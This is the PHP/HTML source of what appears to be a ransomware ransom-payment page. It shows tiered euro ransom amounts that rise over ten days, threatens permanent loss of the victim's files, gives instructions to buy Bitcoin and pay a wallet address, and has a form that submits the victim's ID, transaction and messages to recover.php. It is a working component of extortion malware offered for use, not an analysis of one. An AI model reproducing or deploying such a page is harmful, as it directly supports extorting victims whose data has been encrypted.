<?php
  require("common.php");
?>
<h1 style="color:red">How to recorver your files</h1>
<h2>You need to pay, the quicker you do it, the less you pay!</h2>
<h2><u>Rates:</u></h2>
<ul>
  <li><b><?php echo $withinThree ?>&euro;</b> within <b>3 days</b></li>
  <li><b><?php echo $withinSix ?>&euro;</b> from <b>4 days</b> to <b>6 days</b></li>
  <li><b><?php echo $withinTen ?>&euro;</b> from <b>7 days</b> to <b>10 days</b></li>
  <li><b>After <u>10 days</u> your files will be lost forever!</b></li>
</ul>

<h2>How to pay</h2>
<ol>
  <li>Buy Bitcoins (i.e. https://www.coinbase.com/buy-bitcoin)</li>
  <li>Send the required amount at this btc address: <b><u><?php echo $walletAddr ?></u></b></li>
  <li>Once the transaction is complete, fill in the form with your <b>Personal ID</b> and the payment <b>Transaction</b></li>
  <li>If all provided data are corrrect, you'll get the key and the istruction to decyprt your files</li>
  <li>
    In case of problems, <b>only once you have paid</b>, the transaction is correct and you made everything well, you can send a message. If everything it's ok I will answer to help you. My answers will appear (as soon as possible) in the next page once you send your Personal ID<br>
    <b><u>NB:</u></b> you are allowed to send only <b>three messages</b>. All the others will be ignored, use them carefully!
  </li>
</ol>
<br>
<form action="recover.php" method="post">
    <div class="form-group">
        <label>Personal ID</label>
        <input type="text" name="guid" class="form-control" value="">
    </div>
    <div class="form-group">
        <label>Transaction</label>
        <input type="text" name="trx" class="form-control" value="">
    </div>
    <br>
    <div class="form-group">
        <label>Message</label>
        <textarea name="msg" class="form-control" value="" rows="4" cols="50"></textarea>
    </div>
    <div class="form-group">
        <input type="submit" class="btn btn-primary" value="Submit">
    </div>
</form>
<br>
<p><u>PS:</u> You better follow the istruction. If you try to work around the system, the needed key to decyprt files could be lost forever</p>
<p><u>PPS:</u> if you cannot see any content in the next page once you submit your personal id it's normal. It means you have not asked any question. Remember you have only 3 of them available, do not waste them!</p>

<p style="color: gray;">-- Nothing is true, Everything is permitted --</p>